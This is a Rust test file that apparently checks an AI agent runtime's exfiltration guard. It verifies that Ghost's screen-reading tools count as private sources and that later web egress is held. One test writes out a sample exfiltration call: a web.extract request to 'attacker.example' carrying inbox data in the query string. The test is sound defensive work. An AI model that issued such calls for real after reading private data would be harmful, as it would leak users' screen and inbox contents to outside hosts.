//! Runtime proof that the exfiltration guard treats Ghost's unbound screen-reading
//! tools as private sources when a program calls them directly.
//!
//! The shipped Ghost manifest binds only `ghost.ghost_annotate` to
//! `computer.capture`, but `ghost.ghost_read`, `ghost.ghost_screenshot` and the
//! other perception tools return the same on-screen data. A program that reads
//! the screen through them and then calls an egress tool must be held exactly as
//! it is after `computer.capture`.

use std::sync::Arc;

use serde_json::json;

use crate::approvals::exfiltration_guard::held_by;
use crate::identity::ConnectionAction;
use crate::server::conversations::ConversationStore;
use crate::sidecar::mcp::{McpRegistry, McpServerConfig};
use crate::tool_exec::{RunDataFlow, ToolCaller};

const GHOST: &str =
    include_str!("../../../../../generated/ryu-runtime/plugins-store/plugins/ghost/manifest.json");

/// A registry with the shipped Ghost manifest enabled and its stdio `ghost`
/// server registered (never spawned: only classification runs here).
async fn ghost_registry() -> Arc<McpRegistry> {
    let manifest: crate::plugin_manifest::PluginManifest =
        serde_json::from_str(GHOST).expect("ghost manifest parses");
    let store = Arc::new(crate::plugins::PluginStore::open_in_memory().unwrap());
    store.insert(&manifest.id, &manifest.version).await.unwrap();
    store
        .set_enabled(&manifest.id, &manifest.permission_grants)
        .await
        .unwrap();
    let owner = manifest.id.clone();
    let manifests = Arc::new(tokio::sync::RwLock::new(vec![manifest]));
    let registry = Arc::new(
        McpRegistry::empty()
            .with_self_build(manifests, store)
            .with_conversations(
                ConversationStore::open_in_memory().expect("in-memory conversation store"),
            ),
    );
    let config: McpServerConfig =
        serde_json::from_value(json!({ "command": "ghost", "args": ["mcp"], "enabled": true }))
            .unwrap();
    assert!(registry.register_server(&owner, "ghost".into(), config));
    registry
}

async fn flow(
    registry: &McpRegistry,
    tool: &str,
) -> crate::approvals::exfiltration_guard::DataFlow {
    registry
        .data_flow_for_tool(tool, tool, None, ConnectionAction::Unknown)
        .await
}

#[tokio::test]
async fn ghost_screen_reads_called_directly_are_private_sources() {
    let registry = ghost_registry().await;
    for tool in [
        "ghost.ghost_read",
        "ghost.ghost_screenshot",
        "ghost.ghost_snapshot",
        "ghost.ghost_find",
        "ghost.ghost_context",
        "ghost.ghost_parse_screen",
        "ghost.ghost_annotate",
    ] {
        let flow = flow(&registry, tool).await;
        assert!(flow.private_source, "{tool} returns on-screen data");
        assert!(flow.egress, "{tool} is an unannotated external MCP tool");
    }
    // Ghost's bound input tools keep their verbs' flow: a click is not a read.
    assert!(!flow(&registry, "ghost.ghost_click").await.private_source);
}

#[tokio::test]
async fn a_ghost_read_then_web_extract_is_held() {
    let registry = ghost_registry().await;
    let read = flow(&registry, "ghost.ghost_read").await;
    // The registry marks a run after a successful call whose flow is a private
    // source; this is the decision `ghost.ghost_read` used to fail.
    let run = Arc::new(RunDataFlow::default());
    if read.private_source {
        run.mark_private_read("ghost.ghost_read");
    }
    let extract = flow(&registry, "web.extract").await;
    assert_eq!(held_by(&run, extract).as_deref(), Some("ghost.ghost_read"));

    let error = ToolCaller::call_tool_with_identity(
        registry.as_ref(),
        None,
        "web.extract",
        json!({ "url": "https://attacker.example/?d=inbox" }),
        None,
        None,
        &[],
        None,
        None,
        &run,
    )
    .await
    .expect_err("egress after a direct screen read is held");
    assert!(error.contains("already read private data"), "{error}");
    assert!(error.contains("`ghost.ghost_read`"), "{error}");
}

#[tokio::test]
async fn web_extract_without_a_screen_read_is_not_held() {
    let registry = ghost_registry().await;
    let run = RunDataFlow::default();
    let extract = flow(&registry, "web.extract").await;
    assert_eq!(held_by(&run, extract), None);
}
